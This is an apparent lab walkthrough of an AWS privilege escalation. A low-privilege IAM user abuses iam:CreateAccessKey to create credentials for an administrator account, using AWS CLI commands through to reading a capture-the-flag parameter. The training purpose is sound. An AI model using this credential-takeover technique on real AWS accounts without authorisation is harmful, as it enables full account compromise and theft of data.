# Guided Walkthrough: Privilege Escalation via iam:CreateAccessKey

This scenario demonstrates a critical privilege escalation vulnerability where a user has permission to create access keys for other IAM users, including those with administrative privileges. The `iam:CreateAccessKey` permission allows an attacker to generate new programmatic credentials for any user they have permission to target, effectively assuming that user's identity and permissions.

In many environments, IAM users with administrative access are created for emergency access or legacy purposes. If a less privileged user has `iam:CreateAccessKey` permission on these admin accounts, they can bypass all intended access controls by simply creating new credentials and authenticating as the privileged user. This is particularly dangerous because it allows complete identity takeover without requiring the victim's existing credentials.

This attack is straightforward to execute, difficult to prevent through traditional IAM boundaries, and can provide instant administrative access to an entire AWS environment. Organizations often overlook this privilege escalation path because it doesn't modify permissions directly — instead, it exploits the ability to generate new authentication credentials for existing privileged accounts.

## The Challenge

You start as `pl-prod-iam-002-to-admin-starting-user` — a low-privilege IAM user whose credentials were obtained through some initial access vector. Your goal is to reach full administrative access in the AWS account.

The `pl-prod-iam-002-to-admin-target-user` IAM user has `AdministratorAccess` attached. Your starting user has been granted `iam:CreateAccessKey` scoped specifically to that admin user. You don't need to modify any policies, assume any roles, or exploit a vulnerability in AWS itself — you simply need to notice what your permissions allow and use them.

## Reconnaissance

First, let's confirm who we are and verify the starting user can't already do anything interesting:

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>

aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::<account_id>:user/pl-prod-iam-002-to-admin-starting-user
```

Try something admin-level to confirm you're limited:

```bash
aws iam list-users --max-items 1
# An error occurred (AccessDenied) ...
```

Good — we're working with minimal permissions. Now let's look at what we can do. The helpful permissions (`iam:ListUsers`, `iam:GetUser`, `iam:ListAttachedUserPolicies`) let you discover the target:

```bash
aws iam list-users --output table
```

You'll see `pl-prod-iam-002-to-admin-target-user` in the list. Checking its attached policies reveals `AdministratorAccess`. That's your target.

## Exploitation

The core of this attack is a single API call. Your starting user has `iam:CreateAccessKey` scoped to the admin user, so you can generate a fresh set of credentials for them without touching any policies:

```bash
aws iam create-access-key --user-name pl-prod-iam-002-to-admin-target-user --output json
```

The response will contain a new `AccessKeyId` and `SecretAccessKey`. Copy them. IAM access keys need a moment to propagate, so wait about 15 seconds before using them:

```bash
sleep 15
```

Now switch to the admin user's credentials:

```bash
export AWS_ACCESS_KEY_ID=<new_access_key_id>
export AWS_SECRET_ACCESS_KEY=<new_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::<account_id>:user/pl-prod-iam-002-to-admin-target-user
```

You are now operating as the admin user.

## Verification

With the admin user's credentials, the earlier `AccessDenied` call now succeeds:

```bash
aws iam list-users --max-items 3 --output table
```

You should see the full list of IAM users in the account. From here you have `AdministratorAccess` — full control over the AWS account.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy attached to `pl-prod-iam-002-to-admin-target-user` provides implicitly.

Using the admin user credentials you created in the previous step, read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/iam-002-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited a one-hop privilege escalation path. The starting user never had admin permissions — it had only one permission: `iam:CreateAccessKey` on a specific user. That single permission was enough to generate a new credential for an admin user and completely take over their identity.

This class of vulnerability is especially hard to catch with conventional policy reviews because nothing was modified. No policy was changed. No role was assumed. The escalation happened entirely through credential generation, which is easily overlooked in IAM access reviews. In a real environment, this kind of misconfiguration often appears in break-glass accounts, legacy automation users, or provisioning pipelines where the access key creation permission is granted more broadly than intended.
